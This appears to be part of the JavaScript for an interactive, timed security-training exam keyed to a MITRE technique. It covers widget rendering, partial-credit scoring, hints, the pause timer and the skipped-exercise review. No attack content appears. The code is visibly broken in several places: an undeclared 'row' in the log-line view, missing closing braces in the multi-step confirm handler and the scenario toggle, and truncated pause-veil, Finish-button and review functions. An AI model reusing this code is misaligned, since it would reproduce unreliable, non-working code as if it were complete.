      var t = el('div', 'kw-theme');
      t.appendChild(el('h3', null, esc(th.name)));
      var ul = el('ul');
      th.concepts.forEach(function (c) { ul.appendChild(el('li', null, esc(c))); });
      t.appendChild(ul);
      grid.appendChild(t);
    });
    kw.appendChild(grid);
    root.appendChild(kw);
    /* 4. how this exam works */
    var types = [];
    EXERCISES.forEach(function (ex) { if (types.indexOf(TYPE_NAMES[ex.type]) < 0) types.push(TYPE_NAMES[ex.type]); });
    var how = el('div', 'card intro-sec');
    how.appendChild(el('h2', null, '<span class="ic" aria-hidden="true">🧭</span> How this exam works'));
    how.appendChild(el('ul', 'rules',
      '<li><b>Passing score:</b> you need <b>70%</b> to pass. PASS means you showed real understanding of ' + esc(META.mitreId) + ' at this level; FAIL means you should review and retake.</li>' +
      '<li><b>Exercise types in this file:</b> ' + types.map(esc).join(' · ') + '.</li>' +
      '<li><b>Timer:</b> the countdown runs while you work. The <b>Pause</b> button hides the exercise for a real break. Pressing <b>Check</b> also stops the timer automatically (⏸ PAUSED — reviewing feedback): study the feedback as long as you want, the timer resumes only when you press <b>Next</b>.</li>' +
      '<li><b>Partial credit:</b> exercises with several correct items are scored per item. Selecting wrong items subtracts: credit = max(0, (correct − wrong) / total).</li>' +
      '<li><b>Hints:</b> one hint per exercise costs <b>−10% of that exercise\'s credit</b> (never below zero).</li>' +
      '<li><b>Skipping:</b> every exercise has a Skip button. Skipped exercises are collected in a review screen before you finish, and you can answer them there while the timer still runs. Skipped-and-never-answered exercises are excluded from your score.</li>'));
    how.appendChild(el('div', 'typlist', '<span class="typ">' + META.questionCount + ' exercises</span><span class="typ">timer ' + fmtTime((META.estimatedMinutes || 15) * 60) + '</span><span class="typ">pass 70%</span><span class="typ">severity: ' + esc(META.severityLabel) + '</span>'));
    var startRow = el('div', 'actions');
    var startBtn = el('button', 'btn btn-primary', '▶ Start the exam');
    startBtn.setAttribute('aria-label', 'Start the exam');
    startBtn.addEventListener('click', startExam);
    startRow.appendChild(startBtn);
    how.appendChild(startRow);
    root.appendChild(how);
  }
  function startExam() {
    if (!S.started) { S.started = true; startTimer(); }
    else { setTimerState(S.timerState === 'PAUSED_AUTO_CHECK' ? 'PAUSED_AUTO_CHECK' : S.timerState); }
    showScreen('exam');
    renderExercise(S.current);
  }

  /* ---------------- widgets ---------------- */
  function optRow(idx, text) {
    var b = el('button', 'opt', '<span class="key" aria-hidden="true">' + String.fromCharCode(65 + idx) + '.</span><span class="opt-txt">' + text + '</span>');
    b.type = 'button'; b.dataset.idx = idx;
    b.setAttribute('aria-label', 'Option ' + String.fromCharCode(65 + idx));
    return b;
  }
  function widgetFor(ex, box, wstate) {
    if (ex.type === 'qcm-single' || ex.type === 'qcm-multi') {
      var wrap = el('div', null, '');
      wstate.sel = wstate.sel || [];
      ex.options.forEach(function (o, i) {
        var r = optRow(i, o);
        if (wstate.sel.indexOf(i) >= 0) r.classList.add('sel');
        r.addEventListener('click', function () {
          if (S.answers[S.current].status === 'checked') return;
          if (ex.type === 'qcm-single') { wstate.sel = [i]; wrap.querySelectorAll('.opt').forEach(function (x) { x.classList.remove('sel'); }); r.classList.add('sel'); }
          else { var p = wstate.sel.indexOf(i); if (p >= 0) { wstate.sel.splice(p, 1); r.classList.remove('sel'); } else { wstate.sel.push(i); r.classList.add('sel'); } }
        });
        wrap.appendChild(r);
      });
      box.appendChild(wrap);
    } else if (ex.type === 'fill-blank') {
      wstate.vals = wstate.vals || {};
      var parts = ex.template.split(/(<input\d+>)/g);
      var fw = el('div', 'fillwrap');
      parts.forEach(function (p) {
        var m = /^<input(\d+)>$/.exec(p);
        if (m) {
          var bi = parseInt(m[1], 10) - 1, bl = ex.blanks[bi];
          var inp = document.createElement('input');
          inp.type = 'text'; inp.placeholder = bl.placeholder || ''; inp.style.width = (bl.width || 14) + 'ch';
          inp.setAttribute('aria-label', 'Blank ' + (bi + 1));
          inp.value = wstate.vals[bi] || '';
          inp.addEventListener('input', function () { wstate.vals[bi] = inp.value; });
          fw.appendChild(inp);
        } else if (p) { fw.appendChild(el('span', null, p)); }
      });
      box.appendChild(fw);
    } else if (ex.type === 'drag-drop') {
      wstate.place = wstate.place || {}; // bankIdx -> slotIdx
      wstate.active = wstate.active === undefined ? null : wstate.active;
      var dd = el('div', 'ddwrap');
      var bank = el('div', 'ddbank'); bank.dataset.bank = '1';
      bank.setAttribute('aria-label', 'Item bank');
      var bankH = el('div', 'dd-hint', 'Item bank — click an item, then click a slot (or drag it)');
      var bankList = el('div', null);
      function chipEl(bi, inSlot) {
        var c = el('button', 'chip', esc(ex.bank[bi]));
        c.type = 'button'; c.draggable = true; c.dataset.bi = bi;
        c.setAttribute('aria-label', 'Item: ' + ex.bank[bi] + (inSlot ? ' (placed)' : ''));
        if (wstate.active === bi) c.classList.add('active');
        c.addEventListener('click', function () {
          if (S.answers[S.current].status === 'checked') return;
          if (inSlot) { delete wstate.place[bi]; wstate.active = null; rerender(); }
          else { wstate.active = (wstate.active === bi ? null : bi); rerender(); }
        });
        c.addEventListener('dragstart', function (ev) { try { ev.dataTransfer.setData('text/plain', String(bi)); } catch (e) { } });
        return c;
      }
      function rerender() {
        bankList.innerHTML = '';
        S.shuffles[S.current].bank.forEach(function (bi) { if (wstate.place[bi] === undefined) bankList.appendChild(chipEl(bi, false)); });
        dd.querySelectorAll('.sl-body').forEach(function (b) { b.innerHTML = ''; });
        ex.slots.forEach(function (sl, si) {
          var body = dd.querySelector('[data-slot="' + si + '"]');
          Object.keys(wstate.place).forEach(function (k) { if (wstate.place[k] === si) body.appendChild(chipEl(parseInt(k, 10), true)); });
        });
      }
      bank.appendChild(bankH); bank.appendChild(bankList); dd.appendChild(bank);
      var slotsBox = el('div', 'ddslots');
      ex.slots.forEach(function (sl, si) {
        var sd = el('div', 'ddslot');
        sd.appendChild(el('div', 'sl-h', esc(sl.label)));
        var body = el('div', 'sl-body'); body.dataset.slot = si; body.tabIndex = 0;
        body.addEventListener('keydown', function (ev) { if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); body.click(); } });
        body.setAttribute('aria-label', 'Slot: ' + sl.label);
        body.addEventListener('click', function () {
          if (S.answers[S.current].status === 'checked' || wstate.active === null) return;
          wstate.place[wstate.active] = si; wstate.active = null; rerender();
        });
        body.addEventListener('dragover', function (ev) { ev.preventDefault(); sd.classList.add('over'); });
        body.addEventListener('dragleave', function () { sd.classList.remove('over'); });
        body.addEventListener('drop', function (ev) {
          ev.preventDefault(); sd.classList.remove('over');
          if (S.answers[S.current].status === 'checked') return;
          var bi = parseInt(ev.dataTransfer.getData('text/plain'), 10);
          if (!isNaN(bi)) { wstate.place[bi] = si; wstate.active = null; rerender(); }
        });
        sd.appendChild(body); slotsBox.appendChild(sd);
      });
      dd.appendChild(slotsBox);
      box.appendChild(dd);
      rerender();
    } else if (ex.type === 'ordering') {
      wstate.order = wstate.order || S.shuffles[S.current].ord.slice();
      var ol = el('ul', 'ordlist'); ol.setAttribute('aria-label', 'Ordering list — use the arrows to reorder');
      function drawOrd() {
        ol.innerHTML = '';
        wstate.order.forEach(function (bi, pos) {
          var li = el('li');
          li.appendChild(el('span', 'ord-idx', String(pos + 1)));
          li.appendChild(el('span', 'ord-txt', esc(ex.items[bi])));
          var btns = el('span', 'ord-btns');
          var up = el('button', null, '↑'); up.type = 'button'; up.setAttribute('aria-label', 'Move item ' + (pos + 1) + ' up');
          up.disabled = pos === 0;
          up.addEventListener('click', function () { var o = wstate.order, t = o[pos]; o[pos] = o[pos - 1]; o[pos - 1] = t; drawOrd(); });
          var dn = el('button', null, '↓'); dn.type = 'button'; dn.setAttribute('aria-label', 'Move item ' + (pos + 1) + ' down');
          dn.disabled = pos === wstate.order.length - 1;
          dn.addEventListener('click', function () { var o = wstate.order, t = o[pos]; o[pos] = o[pos + 1]; o[pos + 1] = t; drawOrd(); });
          btns.appendChild(up); btns.appendChild(dn); li.appendChild(btns); ol.appendChild(li);
        });
      }
      drawOrd(); box.appendChild(ol);
    } else if (ex.type === 'matching') {
      wstate.assign = wstate.assign || {}; // leftIdx -> rightIdx
      wstate.activeLeft = wstate.activeLeft === undefined ? null : wstate.activeLeft;
      var mw = el('div', 'matchwrap');
      var lcol = el('div', 'matchcol'), rcol = el('div', 'matchcol');
      lcol.appendChild(el('div', 'mc-h', 'Left — items'));
      rcol.appendChild(el('div', 'mc-h', 'Right — matches'));
      function drawMatch() {
        lcol.querySelectorAll('.mchip').forEach(function (x) { x.remove(); });
        rcol.querySelectorAll('.mchip').forEach(function (x) { x.remove(); });
        ex.pairs.forEach(function (p, li) {
          var b = el('button', 'mchip', (wstate.assign[li] !== undefined ? '<span class="pairno">' + (wstate.assign[li] + 1) + '</span>' : '') + esc(p.left));
          b.type = 'button';
          if (wstate.activeLeft === li) b.classList.add('active');
          else if (wstate.assign[li] !== undefined) b.classList.add('paired');
          b.addEventListener('click', function () {
            if (S.answers[S.current].status === 'checked') return;
            if (wstate.assign[li] !== undefined) { delete wstate.assign[li]; wstate.activeLeft = null; drawMatch(); return; }
            wstate.activeLeft = (wstate.activeLeft === li ? null : li); drawMatch();
          });
          lcol.appendChild(b);
        });
        S.shuffles[S.current].right.forEach(function (ri, pos) {
          var usedBy = -1; Object.keys(wstate.assign).forEach(function (k) { if (wstate.assign[k] === ri) usedBy = parseInt(k, 10); });
          var b = el('button', 'mchip', (usedBy >= 0 ? '<span class="pairno">' + (usedBy + 1) + '</span>' : '') + esc(ex.pairs[ri].right));
          b.type = 'button';
          if (usedBy >= 0) b.classList.add('paired');
          b.addEventListener('click', function () {
            if (S.answers[S.current].status === 'checked') return;
            if (usedBy >= 0) { delete wstate.assign[usedBy]; drawMatch(); return; }
            if (wstate.activeLeft === null) return;
            wstate.assign[wstate.activeLeft] = ri; wstate.activeLeft = null; drawMatch();
          });
          rcol.appendChild(b);
        });
      }
      drawMatch();
      mw.appendChild(lcol); mw.appendChild(rcol); box.appendChild(mw);
      var un = el('button', 'btn btn-ghost matchundo', '↺ Undo all pairs');
      un.type = 'button';
      un.addEventListener('click', function () { if (S.answers[S.current].status === 'checked') return; wstate.assign = {}; wstate.activeLeft = null; drawMatch(); });
      box.appendChild(un);
    } else if (ex.type === 'terminal') {
      wstate.cmd = wstate.cmd || '';
      var term = el('div', 'term');
      term.appendChild(el('div', 't-bar',
        '<span class="t-dot d-r"></span><span class="t-dot d-a"></span><span class="t-dot d-g"></span><span class="t-title">' + esc(ex.shellPrompt || 'shell') + ' — type the command, then press Enter or Check</span>'));
      var body = el('div', 't-body');
      var hist = el('div', 't-hist'); hist.textContent = wstate.cmd ? wstate.cmd : '';
      var inrow = el('div', 't-in');
      var pr = el('span', 'pr', esc(ex.shellPrompt || '$'));
      var inp = document.createElement('input');
      inp.type = 'text'; inp.value = wstate.cmd; inp.setAttribute('aria-label', 'Terminal command input'); inp.autocomplete = 'off'; inp.spellcheck = false;
      inp.addEventListener('input', function () { wstate.cmd = inp.value; hist.textContent = ''; });
      inp.addEventListener('keydown', function (ev) { if (ev.key === 'Enter') { ev.preventDefault(); doCheck(); } });
      inrow.appendChild(pr); inrow.appendChild(inp);
      body.appendChild(hist); body.appendChild(inrow); term.appendChild(body);
      box.appendChild(term);
      if (ex.syntaxPanel) box.appendChild(el('div', 'syntax', ex.syntaxPanel));
      setTimeout(function () { try { inp.focus(); } catch (e) { } }, 60);
    } else if (ex.type === 'line-select') {
      wstate.sel = wstate.sel || [];
      var lv = el('div', 'logview');
      var bar = el('div', 'lv-bar', '<span class="lv-tag">FILTER</span>');
      var finp = document.createElement('input');
      finp.type = 'text'; finp.placeholder = ex.filterable ? 'filter lines… (visual aid only)' : 'visual filter…';
      finp.setAttribute('aria-label', 'Filter log lines');
      bar.appendChild(finp); lv.appendChild(bar);
      var lines = el('div', 'lv-lines');
      function drawLines(f) {
        lines.innerHTML = '';
        ex.logLines.forEach(function (l, i) {
          if (f && l.toLowerCase().indexOf(f.toLowerCase()) < 0) return;

          row.appendChild(el('span', 'ln', String(i + 1)));
          row.appendChild(el('span', null, esc(l)));
          row.addEventListener('click', function () {
            if (S.answers[S.current].status === 'checked') return;
            var p = wstate.sel.indexOf(i); if (p >= 0) { wstate.sel.splice(p, 1); row.classList.remove('sel'); row.setAttribute('aria-label', 'Log line ' + (i + 1)); }
            else { wstate.sel.push(i); row.classList.add('sel'); }
          });
          row.addEventListener('keydown', function (ev) { if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); row.click(); } });

      }
      drawLines('');
      finp.addEventListener('input', function () { drawLines(finp.value.trim()); });

      box.appendChild(el('div', 'dd-hint', 'Click the line(s) that answer the question. The filter box is a visual aid only — filtering does not change your selection.'));
    } else if (ex.type === 'multi-step') {
      wstate.step = wstate.step === undefined ? 0 : wstate.step;
      wstate.picks = wstate.picks || {};
      wstate.stepSel = wstate.stepSel === undefined ? null : wstate.stepSel;
      drawStep();
    }
    function drawStep() {
      var sw = el('div', null, '');
      /* outcomes of already-confirmed intermediate steps */
      for (var done = 0; done < wstate.step; done++) {
        var pk = wstate.picks[done];
        var okv = pk === ex.steps[done].correct;
        sw.appendChild(el('div', 'outcome', (okv ? '✓ ' : '✗ ') + 'Step ' + (done + 1) + ' confirmed — the scenario continues. ' + esc(ex.steps[done].outcome || '') + (done === wstate.step - 1 ? ' <b>Intermediate step: the timer keeps running.</b>' : '')));
      }
      var st = ex.steps[wstate.step];
      sw.appendChild(el('span', 'step-h', '⎘ STEP ' + (wstate.step + 1) + ' OF ' + ex.steps.length));
      sw.appendChild(el('div', 'block-b', st.prompt));
      var confirmBtn = null;
      st.options.forEach(function (o, i) {
        var r = optRow(i, o);
        if (wstate.stepSel === i) r.classList.add('sel');
        r.addEventListener('click', function () {
          if (wstate.picks[wstate.step] !== undefined) return;
          wstate.stepSel = i;
          sw.querySelectorAll('.opt').forEach(function (x) { x.classList.remove('sel'); });
          r.classList.add('sel');
          if (confirmBtn) confirmBtn.disabled = false;
        });
        sw.appendChild(r);
      });
      confirmBtn = el('button', 'btn btn-blue', (wstate.step === ex.steps.length - 1 ? '✓ Confirm final step & check' : '→ Confirm step'));
      confirmBtn.type = 'button'; confirmBtn.disabled = wstate.stepSel === null;
      confirmBtn.setAttribute('aria-label', 'Confirm step ' + (wstate.step + 1));
      confirmBtn.addEventListener('click', function () {

        wstate.picks[wstate.step] = wstate.stepSel;
        wstate.stepSel = null;
        if (wstate.step < ex.steps.length - 1) {
          wstate.step++;
          drawStep(); /* intermediate: no auto-pause, timer keeps running */
        } else {

        }

      sw.appendChild(confirmBtn);
      box.innerHTML = '';
      box.appendChild(sw);
    }
  }

  /* ---------------- scoring ---------------- */
  function scoreExercise(ex, wstate) {
    var items = [], N = 0, H = 0, W = 0, canon = null;
    function item(state, label) { items.push({ state: state, label: label }); }
    if (ex.type === 'qcm-single') {
      N = 1;
      var sel = wstate.sel && wstate.sel[0];
      if (sel === undefined) { item('mi', 'No option selected'); }
      else if (sel === ex.correct) { H = 1; item('ok', '✓ Correct — ' + strip(ex.options[ex.correct])); }
      else { W = 1; item('no', '✗ You chose: ' + strip(ex.options[sel])); }
      canon = ex.options[ex.correct];
    } else if (ex.type === 'qcm-multi') {
      N = ex.correct.length;
      var selset = wstate.sel || [];
      ex.correct.forEach(function (ci) {
        if (selset.indexOf(ci) >= 0) { H++; item('ok', '✓ Correct: ' + strip(ex.options[ci])); }
        else { item('mi', '○ Missed: ' + strip(ex.options[ci])); }
      });
      selset.forEach(function (si) { if (ex.correct.indexOf(si) < 0) { W++; item('no', '✗ Wrong: ' + strip(ex.options[si])); } });
      canon = ex.correct.map(function (ci) { return strip(ex.options[ci]); }).join(' · ');
    } else if (ex.type === 'fill-blank') {
      N = ex.blanks.length;
      ex.blanks.forEach(function (bl, bi) {
        var v = norm(wstate.vals && wstate.vals[bi]);
        var accept = [norm(bl.answer)].concat((bl.alts || []).map(norm));
        if (!v) { item('mi', '○ Missed blank ' + (bi + 1) + ' — expected: ' + esc(bl.answer)); }
        else if (accept.indexOf(v) >= 0) { H++; item('ok', '✓ Blank ' + (bi + 1) + ': ' + esc(bl.answer)); }
        else { W++; item('no', '✗ Blank ' + (bi + 1) + ' — you typed "' + esc(v) + '", expected: ' + esc(bl.answer)); }
      });
      canon = ex.blanks.map(function (bl) { return bl.answer; }).join(' | ');
    } else if (ex.type === 'drag-drop') {
      N = ex.bank.length;
      Object.keys(wstate.place || {}).forEach(function (k) {
        var bi = parseInt(k, 10), si = wstate.place[k];
        if (ex.slots[si] && ex.slots[si].accept.indexOf(bi) >= 0) { H++; item('ok', '✓ "' + strip(ex.bank[bi]) + '" → ' + esc(ex.slots[si].label)); }
        else { W++; item('no', '✗ "' + strip(ex.bank[bi]) + '" does not belong in ' + esc(ex.slots[si] ? ex.slots[si].label : '?')); }
      });
      ex.bank.forEach(function (t, bi) { if (wstate.place[bi] === undefined) item('mi', '○ Missed: "' + strip(t) + '" → ' + esc(slotLabelFor(ex, bi))); });
      canon = ex.slots.map(function (sl) { return sl.label + ': ' + sl.accept.map(function (bi) { return strip(ex.bank[bi]); }).join(', '); }).join(' | ');
    } else if (ex.type === 'ordering') {
      N = ex.items.length;
      var order = wstate.order || [];
      order.forEach(function (bi, pos) {
        if (bi === pos) { H++; item('ok', '✓ Position ' + (pos + 1) + ': ' + strip(ex.items[pos])); }
        else { W++; item('no', '✗ Position ' + (pos + 1) + ' — you put "' + strip(ex.items[bi]) + '", expected "' + strip(ex.items[pos]) + '"'); }
      });
      canon = ex.items.map(function (t, i) { return (i + 1) + '. ' + strip(t); }).join(' ');
    } else if (ex.type === 'matching') {
      N = ex.pairs.length;
      ex.pairs.forEach(function (p, li) {
        var a = (wstate.assign || {})[li];
        if (a === undefined) item('mi', '○ Missed: "' + strip(p.left) + '" → ' + esc(p.right));
        else if (a === li) { H++; item('ok', '✓ "' + strip(p.left) + '" → ' + esc(p.right)); }
        else { W++; item('no', '✗ "' + strip(p.left) + '" you matched to "' + strip(ex.pairs[a].right) + '", expected "' + esc(p.right) + '"'); }
      });
      canon = ex.pairs.map(function (p) { return strip(p.left) + ' = ' + strip(p.right); }).join(' | ');
    } else if (ex.type === 'terminal') {
      N = ex.elements.length;
      var cmd = norm(wstate.cmd || '');
      ex.elements.forEach(function (el2) {
        var hit = (el2.any || []).some(function (a) { return cmd.indexOf(String(a).toLowerCase()) >= 0; });
        if (hit) { H++; item('ok', '✓ ' + esc(el2.label)); }
        else { item('mi', '○ Missing: ' + esc(el2.label)); }
      });
      if (!cmd) item('mi', '○ Nothing typed — expected: ' + esc(ex.expected));
      canon = ex.expected;
    } else if (ex.type === 'line-select') {
      N = ex.badLines.length;
      var sel2 = wstate.sel || [];
      ex.badLines.forEach(function (li) {
        if (sel2.indexOf(li) >= 0) { H++; item('ok', '✓ Line ' + (li + 1) + ' is indeed the one to flag'); }
        else { item('mi', '○ Missed line ' + (li + 1) + ': ' + esc(shorten(ex.logLines[li], 90))); }
      });
      sel2.forEach(function (li) {
        if (ex.badLines.indexOf(li) < 0) { W++; item('no', '✗ Line ' + (li + 1) + ' is benign: ' + esc(shorten(ex.logLines[li], 80))); }
      });
      canon = ex.badLines.map(function (li) { return 'line ' + (li + 1); }).join(', ');
    } else if (ex.type === 'multi-step') {
      N = ex.steps.length;
      ex.steps.forEach(function (st, si) {
        var p = (wstate.picks || {})[si];
        if (p === undefined) item('mi', '○ Missed step ' + (si + 1) + ' — expected: ' + strip(st.options[st.correct]));
        else if (p === st.correct) { H++; item('ok', '✓ Step ' + (si + 1) + ': ' + strip(st.options[st.correct])); }
        else { W++; item('no', '✗ Step ' + (si + 1) + ' — you chose "' + strip(st.options[p]) + '", expected "' + strip(st.options[st.correct]) + '"'); }
      });
      canon = ex.steps.map(function (st, si) { return (si + 1) + '. ' + strip(st.options[st.correct]); }).join(' ');
    }
    var credit = N > 0 ? Math.max(0, (H - W) / N) : 0;
    if (N === 1) credit = H === 1 ? 1 : 0; /* single-answer: binary */
    if (S.answers[S.current].hintUsed) credit = Math.max(0, credit - 0.10);
    credit = Math.round(credit * 100) / 100;
    return { credit: credit, items: items, N: N, H: H, W: W, canon: canon };
  }
  function strip(s) { return esc(String(s).replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim()); }
  function shorten(s, n) { s = String(s); return s.length > n ? s.slice(0, n - 1) + '…' : s; }
  function slotLabelFor(ex, bi) { var lbl = ''; ex.slots.forEach(function (sl) { if (sl.accept.indexOf(bi) >= 0) lbl = sl.label; }); return lbl; }

  /* ---------------- exercise screen ---------------- */
  function renderExercise(i) {
    var ex = EXERCISES[i];
    S.current = i;
    var a = S.answers[i];
    var area = $('exerciseArea'); area.innerHTML = '';
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    $('progressBar').style.width = Math.round(((i + 1) / EXERCISES.length) * 100) + '%';
    var tpEl = $('tbPart'); if (tpEl) { tpEl.textContent = 'Exercise ' + (i + 1) + ' of ' + EXERCISES.length; }

    var card = el('div', 'card');
    /* SCENARIO */
    var sc = el('div', 'block blk-scenario');
    var longSc = ex.scenario.length > 380;
    sc.innerHTML = '<div class="block-h"><span aria-hidden="true">📄</span> SCENARIO' + (longSc ? '<button type="button" class="sc-toggle" aria-expanded="true">⇅ collapse</button>' : '') + '</div>' +
      '<div class="block-b" id="scBody">' + ex.scenario + (ex.artifactNote ? '<div class="dd-hint">' + esc(ex.artifactNote) + '</div>' : '') + '</div>';
    card.appendChild(sc);
    if (longSc) {

        tbtn.setAttribute('aria-expanded', String(!open));

      });

    /* QUESTION */
    card.appendChild(el('div', 'block blk-question',
      '<div class="block-h"><span aria-hidden="true">❓</span> QUESTION</div><div class="block-b">' + ex.question + '</div>'));
    /* YOUR ANSWER */
    var answ = el('div', 'block blk-answer', '<div class="block-h"><span aria-hidden="true">✍</span> YOUR ANSWER</div>');
    var abody = el('div', 'block-b'); answ.appendChild(abody); card.appendChild(answ);

    var wstate = a.wstate;
    widgetFor(ex, abody, wstate);

    /* action row */
    var actions = el('div', 'actions');
    var checkBtn = el('button', 'btn btn-primary', '✓ Check');
    checkBtn.type = 'button'; checkBtn.id = 'checkBtn'; checkBtn.setAttribute('aria-label', 'Check your answer');
    checkBtn.addEventListener('click', doCheck);
    var nextBtn = el('button', 'btn btn-blue hidden', (i === EXERCISES.length - 1 || S.reviewMode) ? (S.reviewMode ? '⏭ Back to review' : '⏭ Final submit') : '⏭ Next');
    nextBtn.type = 'button'; nextBtn.id = 'nextBtn';
    nextBtn.addEventListener('click', goNext);
    var hintBtn = el('button', 'btn btn-amber', '💡 Hint (−10%)');
    hintBtn.type = 'button'; hintBtn.setAttribute('aria-label', 'Show hint, costs 10 percent of this exercise credit');
    hintBtn.disabled = a.hintUsed || a.status === 'checked';
    hintBtn.addEventListener('click', function () {
      if (a.hintUsed || a.status === 'checked') return;
      a.hintUsed = true; hintBtn.disabled = true;
      var hb = el('div', 'hintbox', '<div class="hb-h">💡 Hint — this exercise\'s credit is now reduced by 10%</div>' + esc(ex.hint));
      card.insertBefore(hb, actions);
    });
    var skipBtn = el('button', 'btn btn-ghost', '⚠ Skip');
    skipBtn.type = 'button'; skipBtn.setAttribute('aria-label', 'Skip this exercise'); skipBtn.disabled = a.status === 'checked';
    skipBtn.addEventListener('click', doSkip);
    actions.appendChild(checkBtn); actions.appendChild(nextBtn); actions.appendChild(el('span', 'spacer'));
    actions.appendChild(hintBtn); actions.appendChild(skipBtn);
    card.appendChild(actions);
    area.appendChild(card);

    /* manual pause veil (hidden by default) */
    if (S.timerState === 'PAUSED_MANUAL') showPauseVeil();

    /* restore feedback if already checked (should not normally happen) */
    if (a.status === 'checked') { renderFeedback(card, ex, a, true); checkBtn.disabled = true; nextBtn.classList.remove('hidden'); }

    updateScoreBar();

  }
  function renderTopbarButtons() {
    var bar = $('topbar');
    var old = document.getElementById('pauseBtn');
    if (old) old.remove();
    if (S.screen !== 'exam') return;
    var b = el('button', 'btn btn-ghost', '⏸ Pause');
    b.type = 'button'; b.id = 'pauseBtn'; b.setAttribute('aria-label', 'Pause the exam (manual pause)');
    b.addEventListener('click', function () {
      if (S.timerState === 'RUNNING' || S.timerState === 'PAUSED_AUTO_CHECK') {
        S.priorState = S.timerState;
        setTimerState('PAUSED_MANUAL'); showPauseVeil();
      } else if (S.timerState === 'PAUSED_MANUAL') {
        hidePauseVeil(); setTimerState(S.priorState || 'RUNNING');
      }
    });
    bar.appendChild(b);
    var oldF = document.getElementById('finishBtn');
    if (oldF) oldF.remove();
    var f = el('button', 'btn btn-ghost', '⏹ Finish');

  }
  function showPauseVeil() {

    var veil = el('div', 'pause-veil',
      '<div class="pv-ic" aria-hidden="true">⏸</div><div class="pv-word">PAUSED — manual</div>' +
      '<div style="color:var(--text-secondary);max-width:420px">The exercise is hidden while you are on a break. The timer is stopped.</div>');

  function hidePauseVeil() {

  }

  function doCheck() {
    var i = S.current, ex = EXERCISES[i], a = S.answers[i];
    if (a.status === 'checked') return;
    var res = scoreExercise(ex, a.wstate);
    a.status = 'checked';
    a.credit = res.credit;
    a.result = res;
    a.label = res.credit >= 1 ? 'correct' : (res.credit > 0 ? 'partial' : 'incorrect');
    setTimerState('PAUSED_AUTO_CHECK'); /* check-triggered auto-pause */
    var card = $('exerciseArea').querySelector('.card');
    renderFeedback(card, ex, a, false);
    var cb = document.getElementById('checkBtn'); if (cb) cb.disabled = true;
    var sb = document.querySelector('#exerciseArea .btn-ghost'); /* skip button */ if (sb) sb.disabled = true;
    var hb = document.querySelector('#exerciseArea .btn-amber'); if (hb) hb.disabled = true;
    var nb = document.getElementById('nextBtn'); if (nb) nb.classList.remove('hidden');
    lockWidgets(card);
    updateScoreBar();
  }
  function lockWidgets(card) {
    var abody = card.querySelector('.blk-answer');
    if (!abody) return;
    abody.querySelectorAll('button, input').forEach(function (x) {
      x.disabled = true; x.style.pointerEvents = 'none'; x.readOnly = true;
      if (x.classList.contains('chip')) x.draggable = false;
    });
  }
  function renderFeedback(card, ex, a, restoring) {
    var old = card.querySelector('.fb'); if (old) old.remove();
    var res = a.result;
    var cls = a.label === 'correct' ? 'fb-correct' : (a.label === 'partial' ? 'fb-partial' : 'fb-incorrect');
    var word = a.label === 'correct' ? '✓ CORRECT' : (a.label === 'partial' ? '✓ PARTIALLY CORRECT' : '✗ INCORRECT');
    var fb = el('div', 'fb ' + cls);
    var hh = '<span>' + word + '</span>';
    if (res.N > 1) hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + ' — ' + res.H + '/' + res.N + ' items</span>';
    else hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + '</span>';
    if (a.hintUsed) hh += '<span class="fb-credit">💡 hint −0.10 applied</span>';
    fb.appendChild(el('div', 'fb-h', hh));
    var it = el('div', 'fb-items');
    res.items.forEach(function (im) { it.appendChild(el('div', 'fb-item ' + im.state, '<span class="fi-ic">' + (im.state === 'ok' ? '✓' : im.state === 'no' ? '✗' : '○') + '</span><span>' + im.label + '</span>')); });
    fb.appendChild(it);
    if (res.canon) {
      var c = el('div', 'canon');
      c.appendChild(el('div', 'dd-hint', 'Correct answer:'));
      c.appendChild(el('pre', 'art', esc(res.canon)));
      fb.appendChild(c);
    }
    fb.appendChild(el('div', 'exp', ex.explanation));
    if (a.label !== 'correct' && ex.study) fb.appendChild(el('div', 'study', '📚 What to study: ' + esc(ex.study)));
    var acts = card.querySelector('.actions');
    card.insertBefore(fb, acts);
    fb.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function doSkip() {
    var i = S.current, a = S.answers[i];
    if (a.status === 'checked') return;
    a.status = 'skipped';
    if (S.skipped.indexOf(i) < 0) S.skipped.push(i);
    /* no auto-pause: timer keeps running */
    advance();
  }
  function goNext() {
    if (S.timerState === 'PAUSED_AUTO_CHECK') setTimerState('RUNNING'); /* resume on Next */
    if (S.reviewMode) { S.reviewMode = false; renderReview(); showScreen('review'); return; }
    advance();
  }
  function advance() {
    var nxt = -1;
    for (var j = S.current + 1; j < EXERCISES.length; j++) { if (S.answers[j].status === 'unanswered') { nxt = j; break; } }
    if (nxt < 0) { /* none forward: go to review or results */
      for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered') { nxt = k; break; } }
    }
    if (nxt >= 0) renderExercise(nxt);
    else finishExam(false);
  }

  /* ---------------- review-skipped screen ---------------- */
  function renderReview() {
    var root = $('screen-review'); root.innerHTML = '';
    var c = el('div', 'card');
    c.appendChild(el('h2', null, '⚠ Review skipped exercises'));
    var open = S.skipped.filter(function (i) { return S.answers[i].status === 'skipped'; });
    if (open.length === 0) {
      c.appendChild(el('p', null, 'No skipped exercises left — everything was answered.'));
    } else {
      c.appendChild(el('p', 'dd-hint', 'You can return to any skipped exercise and answer it while the timer has not ended. Skipped-and-never-answered exercises are excluded from your score.'));
      open.forEach(function (i) {
        var row = el('div', 'rev-item');
        row.appendChild(el('span', 'ri-id', esc(EXERCISES[i].id)));
        row.appendChild(el('span', 'ri-sum', esc(EXERCISES[i].summary)));
        var b = el('button', 'btn btn-blue', '↩ Return to it');
        b.type = 'button'; b.setAttribute('aria-label', 'Return to ' + EXERCISES[i].id);
        b.addEventListener('click', function () { S.reviewMode = true; S.reviewFrom = 'review'; showScreen('exam'); renderExercise(i); });
        row.appendChild(b);
        c.appendChild(row);
      });
    }
    var acts = el('div', 'actions');
    var back = el('button', 'btn btn-ghost', '← Keep working (unanswered exercises)');
    back.type = 'button';
    back.addEventListener('click', function () {
      var u = -1; for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered' && S.skipped.indexOf(k) < 0) { u = k; break; } }
      if (u < 0) u = -1;
